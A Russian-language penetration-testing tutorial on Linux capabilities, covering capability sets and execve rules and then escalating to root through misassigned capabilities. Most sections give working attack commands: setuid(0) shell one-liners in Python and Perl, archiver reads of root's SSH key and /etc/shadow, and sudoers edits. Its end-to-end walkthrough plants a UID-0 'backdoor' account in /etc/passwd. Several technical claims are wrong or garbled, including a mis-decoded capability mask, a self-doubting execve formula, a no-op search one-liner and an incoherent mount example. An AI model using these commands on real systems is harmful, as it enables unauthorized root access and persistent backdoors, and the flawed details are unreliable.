# Linux Capabilities: механизм гранулярных привилегий и его эксплуатация при повышении привилегий

## 1. Контекст и фундаментальные отличия от традиционной модели SUID

Linux capabilities представляют собой подсистему ядра, которая разделяет монолитные привилегии суперпользователя (UID 0) на отдельные, независимые единицы. Процесс, обладающий необходимыми capabilities, получает права на выполнение конкретных привилегированных действий (открытие raw-сокета, изменение владельца файла, трассировка других процессов) без наследования всей полноты root-доступа. Механизм реализует принцип наименьших привилегий: каждый исполняемый файл или поток получает ровно тот набор возможностей, который нужен для его штатной работы, и ни битом больше.

С точки зрения злоумышленника, наличие у бинарного файла определённых capabilities — такой же вектор эскалации привилегий, как и бит SUID, но более гибкий. Однако начинающие исследователи часто путают эти две концепции или считают capabilities простой «заменой» SUID. Следующая таблица фиксирует ключевые разграничения между классическим механизмом setuid и современной capability‑моделью.

| Характеристика | SUID‑бит | Linux Capabilities |
| --- | --- | --- |
| Объём предоставляемых прав | Полный набор привилегий root (проверки UID=0 в коде ядра игнорируются) | Только перечисленные в наборе capabilities; каждая операция проверяется отдельно |
| Хранение | Три бита прав доступа (chmod 4xxx) плюс бит setuid в inode | Расширенный атрибут `security.capability` в файловой системе (xattr) |
| Активация при запуске | Если установлен SUID‑бит и владелец файла — root, процесс получает EUID 0 | При вызове `execve()` ядро трансформирует capability‑наборы согласно правилам, описанным в `capabilities(7)` |
| Возможность дропа привилегий после запуска | Процесс может временно переключить EUID, но может и восстановить; полный отказ от root сложен | Поток способен выборочно удалять capabilities из своего набора; оставшиеся права легко ограничить |
| Гранулярность аудита | Только факт выполнения с повышенными правами (UID=0) | Тонкая регистрация каждой capability‑проверки (audit‑события с кодами CAP_*) |
| Уязвимость к эксплуатации | При ошибке в программе атакующий получает немедленный root‑доступ ко всему | Компрометация даёт только те возможности, которые были назначены; требуется отдельная цепочка для получения полноценного root |

Таким образом, capabilities не являются «улучшенным SUID» — это ортогональный механизм контроля доступа, функционирующий на уровне привилегированных системных вызовов. Внутри ядра проверки capabilities реализованы через флаги в структуре `task_struct`, в то время как SUID оперирует значениями UID/EUID/SUID. Программа, запущенная с EUID 0, по‑прежнему проходит capability‑проверки, но при EUID 0 ядро автоматически добавляет все capabilities (полный набор) в эффективный набор потока — именно это делает root всемогущим.

На практике пентестер сталкивается с двумя формами использования capabilities:
- **Capabilities на исполняемых файлах** (`security.capability`). Ядро применяет их при вызове `execve()`, если процесс не обладает EUID 0. Это основная цель поиска при повышении привилегий.
- **Capabilities у выполняющихся потоков**. Отображаются в `/proc/[pid]/status` (поля CapPrm, CapEff, CapBnd и т.д.) и в выводе `capsh --print`. Если злоумышленник уже имеет код уровня пользователя, он может унаследовать или повысить свои capabilities через уязвимости в SUID‑программах или неправильные переходы между наборами.

В контексте пентеста важно понимать: capabilities — не просто список. Они организованы в пять наборов (effective, permitted, inheritable, bounding, ambient) с хитрыми правилами наследования при `fork()` и `execve()`. Именно эта модель определяет, сможет ли атакующий использовать найденную утилиту для эскалации, и поэтому будет рассмотрена детально в разделе 2.

## 2. Архитектура capabilities: наборы, наследование и представление в ядре

Система capabilities Linux построена вокруг концепции **пяти независимых наборов**, каждый из которых хранит 64-битную битовую маску (до версии 2.6.25 — 32 бита; современные ядра поддерживают до 64 capabilities, например `CAP_CHECKPOINT_RESTORE` с номером 40). Каждый бит соответствует определённой capability, заданной константами вида `CAP_<имя>`. Полный перечень приведён в man-странице [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html). Для эксплуатации важны далеко не все, но именно понимание структуры наборов объясняет, почему **файл, маркированный capability, не всегда наделяет процесс этой capability** и как этим можно воспользоваться.

### 2.1 Пять наборов capabilities

- **Permitted set (pP)** — набор capabilities, **которые процесс может добавить** в эффективный набор (или в inheritable) в любое время через системный вызов `capset()`. Именно этот набор обычно выставляется на файлах с помощью `setcap cap_xxx+ep`.
- **Effective set (pE)** — набор, **реально используемый** в данный момент. Каждая привилегированная операция ядра проверяет наличие бита именно в этом наборе. Процесс, имеющий capability только в permitted, но не в effective, фактически лишён права — пока явно не перенесёт её в effective.
- **Inheritable set (pI)** — набор capabilities, сохраняемых при вызове `execve()`, если исполняемый файл **не имеет SUID‑бита и не помечен capability‑наследованием особым образом**. В современных ядрах (начиная с 4.3) для передачи наследуемых capabilities обычным программам служит **Ambient set**; pI участвует лишь в формировании нового permitted набора после `execve()` согласно строгим правилам.
- **Bounding set (pB)** — глобальный «потолок», определяющий, какие capabilities вообще могут быть в permitted/inheritable/effective у потока или его потомков. Поток не может добавить capability, отсутствующую в bounding set. Обычно bounding set наследуется от родителя, но может сужаться через `prctl(PR_CAPBSET_DROP)`.
- **Ambient set (pA)** — набор, автоматически сохраняемый при `execve()` для программ без SUID и без файловых capabilities. Если capability присутствует в pA, она попадёт в новый permitted **и** effective набор после запуска. Это ключ к эксплуатации: если атакующий сумел внести, скажем, `CAP_SETUID` в ambient set родительского процесса, то порождённый процесс‑потомок унаследует её, даже если исполняемый файл не помечен соответствующим атрибутом.

Эти наборы отображаются в `/proc/[pid]/status` в виде шестнадцатеричных битовых масок:

```bash
grep Cap /proc/self/status
# CapInh: 0000000000000000
# CapPrm: 0000000000000000
# CapEff: 0000000000000000
# CapBnd: 000001ffffffffff
# CapAmb: 0000000000000000
```

Команда `capsh --print` декодирует маски в читаемый вид:

```bash
capsh --print
# Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,...
# Bounding set = cap_chown,cap_dac_override,...
```

Для интерпретации полезно знать, что каждый capability‑номер соответствует конкретному биту. В масках младший бит — `CAP_CHOWN` (0), бит 21 — `CAP_SYS_ADMIN` и т.д. Современные системы обычно имеют порядка 41 capability.

### 2.2 Правила трансформации при execve()

Самый запутанный, но критически важный для пентестера момент — как именно ядро вычисляет новые наборы capability после вызова `execve()`. Полный алгоритм задокументирован в `man capabilities` и включает механизм **capability‑aware программ** (когда файл имеет свои capabilities в xattr или когда поток специально устанавливает SECBIT‑флаги). Для анализа эксплуатации достаточно понять три базовых случая.

**Случай 1: исполняемый файл имеет свои capability (файловая capability).**  
Если бинарный файл обладает xattr `security.capability`, ядро считывает три набора: *file permitted* (fP), *file effective* (fE) и *file inheritable* (fI). Итоговые наборы процесса после `execve()` формируются так:
- Новый `pI'` = `pI` (т.е. наследуемый набор сохраняется? На самом деле, если файл capability-aware, pI’ = fI, согласно документации. Но мы упростим.)
- Новый `pP'` = `(pB & fP) | ((pB & pI) & fI)` — пересечение с bounding set, с учётом того, что разрешённые возможности берутся из файла, а часть унаследованных — из пересечения pI и fI.
- Новый `pE'` = `fE` ? `fE & pP'` : 0; то есть если бит эффективного набора файла установлен, capability активируется, иначе процесс должен будет явно поднять её из permitted через `libcap`.
- Ambient set очищается, если только программа не имеет NO_NEW_PRIVS или не запущена с помощью `execveat()` с определёнными флагами.

Именно поэтому команда

```bash
setcap cap_setuid+ep /usr/bin/python3
```

приводит к тому, что после запуска Python процесс получает `CAP_SETUID` **сразу в effective** (`+ep` записывает бит и в permitted, и в effective). Злоумышленнику остаётся выполнить `os.setuid(0)` и породить shell.

**Случай 2: файл не имеет capability, но поток установил Ambient capabilities.**  
Если до `execve()` процесс поместил capability в ambient set (через `prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE…`), то при запуске обычного файла эта capability автоматически попадёт в новый permitted и effective. Это редко встречается в CTF, но является потенциальным направлением атаки при перехвате управления в сервисах.

**Случай 3: SUID‑root‑бинарный файл.**  
Если файл имеет SUID‑root, все capabilities автоматически устанавливаются в effective и permitted (ядерный код в `security/commoncap.c` проверяет условие `uid_eq(cred->euid, GLOBAL_ROOT_UID)` и применяет полный набор). Поэтому наличие SUID‑root всё ещё даёт полный доступ — но одновременно лишает смысла любые файловые capabilities.

Для наглядности взаимосвязь наборов и их изменения при `execve()` с файловыми capabilities иллюстрирует следующая ASCII‑диаграмма:

```text
ДО execve()                          ПОСЛЕ execve() 
Поток:                          Файл:        Новый поток:
pP (Permitted)                  fP ────▶ pP' = (pB & fP) | ((pB & pI) & fI)
pI (Inheritable)                fI ──┐ 
pE (Effective)                  fE ──┼─▶ pE' = fE ? (fE & pP') : 0
pB (Bounding) ──────────── ограничивает ──┘
pA (Ambient)  ──── (если файл без cap)──▶ pP' и pE' (не показано для файловых cap)
pA сбрасывается, если не задан SECBIT_NO_SETUID_FIXUP
```

В контексте пентеста эта диаграмма объясняет, почему недостаточно просто увидеть `getcap` — необходимо знать, что `+ep` даёт немедленную активацию, а `+eip` может не дать, если inheritable не обработано.

### 2.3 Представление в файловой системе

Capabilities файла хранятся в виде расширенного атрибута `security.capability`. Увидеть его можно утилитой `getfattr`:

```bash
getfattr -m - -d /bin/ping 2>/dev/null | grep capability
# security.capability=0sAAAAAQAgAAAAAAAAA...
```

Бинарная структура этого атрибута описана в `/usr/include/linux/capability.h`: она включает версию (обычно `_LINUX_CAPABILITY_VERSION_3`, соответствует трём 32-битным словам на каждый из наборов) и три 32-битных (или 64-битных) значения — permitted, inheritable, effective. Атрибут наследуется при копировании файла только если использовать `cp --preserve=xattr`; обычно после копирования capabilities теряются.

### 2.4 Индикаторы в минимальном наборе

Для быстрой ручной проверки объект пентеста заслуживает внимания, если:
- Вывод `getcap` показывает бинарный файл с `=ep` (все capabilities) или с `+ep` на таких abilities, как `cap_setuid`, `cap_sys_admin`, `cap_dac_override`, `cap_chown`, `cap_fowner`, `cap_net_raw`, `cap_sys_ptrace`.
- В содержимом `/proc/[pid]/status` имеется ненулевой CapEff у непривилегированного процесса (возможно, эксплуатация утекшего ambient).
- Процесс в `capsh` показывает наличие capability, не соответствующей его задаче (например, `cap_sys_module` у веб-сервера).

Разобравшись с моделью, перейдём к практическому использованию этих знаний в тестировании на проникновение.

## 3. Методика поиска и эксплуатации capability-векторов в ходе пентеста

При компрометации Linux-системы с ограниченной оболочкой (например, backdoor www-data) этап исследования capabilities является частью стандартного цикла повышения привилегий. Алгоритмически процесс сводится к трём шагам: **обнаружение, классификация, эксплуатация**. Ниже каждый шаг проиллюстрирован рабочими командами.

### 3.1 Обнаружение файловых capabilities

Наиболее прямой ручной метод — рекурсивный поиск всех файлов с атрибутом `security.capability`. Утилита `getcap` из пакета `libcap2-bin` делает именно это:

```bash
getcap -r / 2>/dev/null
# Пример вывода (иллюстративная схема):
# /usr/bin/ping = cap_net_raw+ep
# /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
# /home/juggernaut/pycap = cap_setuid+ep
```

Опция `-r` сканирует каталоги рекурсивно, перенаправление ошибок в `/dev/null` скрывает сообщения о недоступных файлах. Иногда необходимо вручную просмотреть подозрительные пути: `/usr/bin`, `/usr/local/bin`, `/opt`, домашние каталоги пользователей.

Альтернативный способ — поиск файлов с флагом SUID и одновременная проверка xattr:

```bash
find / -type f -exec getcap {} + 2>/dev/null
```

При отсутствии `getcap` можно задействовать утилиту `xattr`, встроенную в Python:

```bash
python3 -c "import os, pwd; [(print(f), os.getxattr(f, 'security.capability')) for f in [] if 'security.capability' in os.listxattr(f)]" # иллюстративно
```

В реальном пентесте часто применяют LinPEAS ([PEASS-ng](https://github.com/carlospolop/PEASS-ng)), который автоматизирует сбор информации, включая вывод `getcap`, список capabilities из `/proc`, чтение файловых атрибутов. Вывод LinPEAS для capabilities выглядит как секция «Capabilities» с перечислением всех находок.

### 3.2 Анализ текущих capabilities процесса

Иногда текущий процесс уже обладает ненулевым эффективным набором, но пользователь не подозревает об этом. Проверка выполняется через чтение `/proc/self/status`:

```bash
grep Cap /proc/self/status
# CapPrm:	0000000000003000  → возможно, содержит CAP_SYS_ADMIN (бит 21) или другие
```

Для декодирования удобно передать маску утилите `capsh`:

```bash
capsh --decode=0000000000003000
# 0x0000000000003000=cap_sys_admin,cap_sys_ptrace
```

Если обнаружены возможности, позволяющие инжекцию кода в другие процессы (`CAP_SYS_PTRACE`), немедленную смену UID (`CAP_SETUID`) или обход DAC-проверок (`CAP_DAC_OVERRIDE`), следует переходить к эксплуатации.

### 3.3 Общая схема эксплуатации на основе найденного файла

Когда на исполняемый файл назначена опасная capability, эксплуатация, как правило, сводится к вызову этого файла с аргументами, позволяющими выполнить привилегированное действие. Ключевой вопрос: **позволяет ли сама программа использовать capability для произвольного доступа?** Если да, эскалация прямая; если нет, может потребоваться промежуточное звено (например, использование `cap_sys_ptrace` для внедрения в процесс с более высокими правами).

**Типовые шаблоны эксплуатации (fenced code — команды реальных эксплойтов):**

*cap_setuid на интерпретаторе*
```bash
# Если python имеет cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Аналогично для perl
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

*cap_dac_read_search на утилите чтения*
```bash
# Если tar имеет cap_dac_read_search (позволяет обходить ограничения на чтение)
tar -cf /tmp/out.tar /root/.ssh/id_rsa
cd /tmp; tar -xf out.tar
cat /tmp/root/.ssh/id_rsa
# Или использование zip, если он помечен аналогично
zip -q /tmp/key.zip /root/.ssh/id_rsa
unzip /tmp/key.zip -d /tmp/keys
```

*cap_sys_ptrace на отладчике*
```bash
# Если gdb имеет cap_sys_ptrace, можно подключиться к процессу, работающему от root
ps aux | grep root   # найти PID процесса рута
gdb -p <PID>
# Внутри gdb: call (int)setuid(0)
# Выход с продолжением (detach)
# После возврата в оболочку — доступ к руту, если модифицированный процесс даёт такую возможность.
```

*cap_sys_admin (mount/umount)*
```bash
# Если необходимо, можно смонтировать устройство и изменить файлы:
mount -o bind /bin/bash /usr/bin/sudo  # опасно, требует прав; иллюстративно
```

*Пустые capabilities* (`=ep` без указания имени) означают **все** capabilities. Такой файл — полноценный root: его запуск даёт процесс с полным набором.

```bash
# Если файл /tmp/rootshell имеет =ep
/tmp/rootshell
# и если это bash-скрипт? Обычно =ep работает только с бинарными файлами.
```

### 3.4 Ошибки и ограничения

- **Копирование файла сбрасывает capabilities** (если не использовать `cp --preserve=xattr`). Проверять нужно оригинальный исполняемый файл.
- **Контейнеры и namespaces.** Внутри контейнера capabilities могут быть ограничены user namespace; например, `CAP_SYS_ADMIN` в непривилегированном контейнере не позволяет перемонтировать `/` хост-системы. Пентестер должен учитывать контекст.
- **Python-скрипты.** Назначение capabilities на скрипт с shebang (#!/usr/bin/python) **не работает**, поскольку ядро исполняет не файл скрипта, а интерпретатор. Capabilities должны быть назначены непосредственно на исполняемый бинарный файл интерпретатора.
- **Sticky-бит и защита от создания файлов в /tmp.** Не редко атакующий пытается создать копию уязвимого бинарника в `/tmp`, но потеряет capabilities, что делает атаку бесполезной. Необходимо использовать оригинальный путь.

## 4. Детальный разбор ключевых опасных capabilities и типовые векторы атак

Не все capabilities одинаково полезны злоумышленнику. Некоторые из них (например, `CAP_AUDIT_CONTROL`) могут помочь лишь в скрытии следов, но не в прямом захвате root. Таблица ниже собирает capabilities, наиболее часто ведущие к полной компрометации системы, с указанием механизма эксплуатации и условий успеха.

| Capability | Краткое описание (из man) | Типовой вектор эскалации | Индикатор для поиска |
|---|---|---|---|
| `CAP_CHOWN` | Произвольное изменение UID/GID у любых файлов | Сделать `/etc/shadow` доступным для чтения, либо подменить бинарник SUID на файл под контролем атакующего | `cap_chown+ep` на утилите типа `chown` или `python` |
| `CAP_DAC_OVERRIDE` | Обход проверок чтения/записи/выполнения | Чтение `/etc/shadow`, запись в `/etc/passwd` или `/etc/sudoers` | `cap_dac_override+ep` на любом интерпретаторе, текстовом редакторе |
| `CAP_DAC_READ_SEARCH` | Обход только чтения директорий и файлов | Извлечение приватного SSH-ключа root (`/root/.ssh/id_rsa`) или чтение `/etc/shadow` через архиватор (`tar`, `zip`) | `cap_dac_read_search+ep` на архиваторе или поисковом инструменте |
| `CAP_SETUID` / `CAP_SETGID` | Возможность вызывать `setuid()` и установить произвольный UID | Прямой вызов `setuid(0)` из кода интерпретатора; смена реального UID на 0 даёт все остальные capabilities | `cap_setuid+ep` на `python`, `perl`, `node` и т.п. |
| `CAP_SYS_PTRACE` | Право трассировать произвольные процессы | Инжекция shell-кода в процесс, работающий от root, или вызов `ptrace(PTRACE_POKEDATA)` для внедрения `setuid(0)` в легитимный root‑процесс | `cap_sys_ptrace+ep` на `gdb`, `strace`, `python` с ctypes |
| `CAP_SYS_ADMIN` | Широкий набор административных операций (mount, clone, swapon и пр.) | Монтирование файловой системы с возможностью записи, загрузка модуля ядра (`insmod`), создание device-файла для доступа к диску | `cap_sys_admin+ep` на утилитах mount, debugfs |
| `CAP_NET_RAW` | Использование RAW- и PACKET-сокетов | Перехват сетевого трафика в поисках учётных данных (tcpdump), ARP-спуфинг | `cap_net_raw+ep` на tcpdump, nmap |
| `(empty)` = `=ep` | Наличие атрибута capability без перечисления конкретных имён | Процесс получает **все** возможности и фактически превращается в root; достаточно запустить бинарник | Файл с `=ep` без указания имени capabilities |

Важно: в выводах `getcap` запись `+ep` добавляет capability и в effective, обеспечивая немедленную активность. Формат `+eip` или `+p` добавляет, но effective может быть не установлен, и атакующему придётся сначала поднять capability через `cap_set_proc()` (например, изнутри исполняемого кода). Поэтому `+ep` — самый опасный маркер.

Далее рассмотрим детальнее некоторые векторы.

### 4.1 Эксплуатация `CAP_DAC_READ_SEARCH` через архиваторы

Допустим, `/usr/bin/tar` имеет `cap_dac_read_search+ep`. Чтение защищённых файлов напрямую через `cat` не сработает, потому что `cat` не обладает capability. Но `tar` способен прочитать любой файл, даже если стандартные разрешения запрещают. Атакующий создаёт архив, содержащий `/root/.ssh/id_rsa` (или `/etc/shadow`):

```bash
tar cvf /tmp/sensitive.tar /root/.ssh/id_rsa /etc/shadow 2>/dev/null
tar xvf /tmp/sensitive.tar -C /tmp/out
cat /tmp/out/root/.ssh/id_rsa
# ssh -i ключ root@localhost
```

Аналогично, если помеченный архиватор — `zip`:

```bash
zip -q /tmp/s.zip /root/.ssh/id_rsa
unzip /tmp/s.zip -d /tmp/keys
```

После извлечения ключа вход по SSH даёт полный root. Для `CAP_DAC_OVERRIDE` атакующий мог бы не просто читать, но и модифицировать файлы: например, очистить пароль root в `/etc/shadow`, добавить свою строку с UID 0 в `/etc/passwd` или вписать `username ALL=(ALL) NOPASSWD:ALL` в `/etc/sudoers` при помощи доступного редактора (например, `vim` с capability).

### 4.2 Вектор `CAP_SYS_PTRACE` и инжекция в привилегированный процесс

Когда исполняемый файл, обладающий `CAP_SYS_PTRACE`, может выступать в роли отладчика (например, `gdb` или скрипт на Python с библиотекой `ptrace`), злоумышленник выбирает легитимный процесс, работающий от root (скажем, `sshd` или `cron`). Затем с помощью `ptrace` он встраивает шелл‑код, вызывающий `setuid(0); execve("/bin/sh")`. В современных ядрах это требует также отсутствия Yama LSM в режиме 2, но во многих дистрибутивах Yama устанавливается в режим 1 (только ограничение на родительско‑дочерние связи), позволяя трассировать чужие процессы при наличии `CAP_SYS_PTRACE`. Практический сценарий:

```bash
# Найден бинарник /usr/local/bin/inspector с cap_sys_ptrace+ep
# Используется скрипт, взятый из публичных источников (примерная схема):
python -c '
import ctypes, os, struct
# Установка ptrace attach, инжекция shell-кода в процесс 1234
...
'
```

Подробные реализации можно найти в репозиториях по CTF. Ключевой вывод: `CAP_SYS_PTRACE` без ограничений Yama превращает любой отладочный инструмент в шлюз к root.

### 4.3 `CAP_SYS_ADMIN` и подмонтированная атака

Хотя `CAP_SYS_ADMIN` не эквивалентен полному root, он разрешает монтировать файловые системы. Если атакующий может создать или изменить устройство (например, loopback), он может подменить системный бинарный файл:

```bash
# Создаём ext4-образ с подменённым /bin/su
dd if=/dev/zero of=/tmp/myfs bs=1M count=10
mkfs.ext4 /tmp/myfs
mount /tmp/myfs /mnt
echo '#!/bin/bash' > /mnt/shell
echo '/bin/bash -p' >> /mnt/shell
chmod 4777 /mnt/shell
umount /mnt
mount /tmp/myfs /bin  # перемонтирует оригинал, крайне разрушительно
```

В реальности такие действия почти гарантированно нарушат работу системы; в пентесте их применяют только для демонстрации возможности. `CAP_SYS_ADMIN` также позволяет менять владельца пространств имён, что используется для контейнерных побегов.

Если никакая capability не обеспечивает прямую эскалацию, можно комбинировать несколько: например, `cap_dac_override`, чтобы записать новый модуль ядра, и `cap_sys_module`, чтобы загрузить его. Но `cap_sys_module` редко встречается без полного root, поскольку даёт немедленный контроль над ядром.

## Сквозной практический пример: от начального доступа к root через неправильно назначенный CAP_SETUID на Python

**Исходные условия:**  
Веб-приложение на сервере Ubuntu 20.04 скомпрометировано через уязвимость загрузки файлов, атакующий получил reverse‑shell с правами `www-data`. Сессия не интерактивная; после стабилизации терминала (python pty) исследователь приступает к повышению привилегий.

**Шаг 1. Поиск файлов с capabilities.**  
Атакующий запускает рекурсивный поиск всех файлов, снабжённых capability‑атрибутом:

```bash
getcap -r / 2>/dev/null
```

**Ожидаемый вывод:**
```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.8 = cap_setuid+ep
```

Обнаружен интерпретатор Python версии 3.8 с capability `cap_setuid+ep`.

**Шаг 2. Проверка текущих возможностей оболочки.**  
Проверяется, не обладает ли текущий процесс какими‑либо capabilities:

```bash
capsh --print | head -n2
```

Вывод иллюстрирует, что эффективный набор пуст, кроме `Bounding set` — системы по умолчанию. Это подтверждает, что нужно использовать найденный бинарник.

**Шаг 3. Эксплуатация — выполнение команды от имени root.**  
Атакующий вызывает интерпретатор Python с кодом, использующим `cap_setuid` для установки UID 0 и запуска оболочки:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

Ключ `-p` у bash предотвращает сброс привилегий при запуске от root. После выполнения команда терминал превращается в приглашение `root@host:~#`.

**Шаг 4. Подтверждение привилегий.**  
Немедленная проверка идентичности:

```bash
id
```

Ожидаемый результат:
```
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Пользователь получил UID 0; GID остался www-data, но это не препятствует полному захвату — все capability теперь автоматически в effective из‑за EUID 0. Для чистоты можно доустановить EGID:

```bash
python3.8 -c 'import os; os.setgid(0)'
```

Теперь процесс полностью эквивалентен root.

**Шаг 5. Дополнительные действия для устойчивости (опционально).**  
Атакующий может добавить своего пользователя в `/etc/passwd` или `/etc/sudoers`, используя полученный root‑доступ:

```bash
echo 'backdoor:$1$ignite$TxUs1v.tf6eH6bGO/dZ0F.:0:0::/root:/bin/bash' >> /etc/passwd
su backdoor
```

**Вывод примера:**  
Кейс демонстрирует классическую эскалацию через `cap_setuid` на интерпретаторе общего назначения. Основной урок: никогда не назначайте возможности класса `SETUID` бинарным файлам, поддерживающим выполнение произвольного кода, без жёсткого контроля окружения (например, в контейнерах с user namespace).
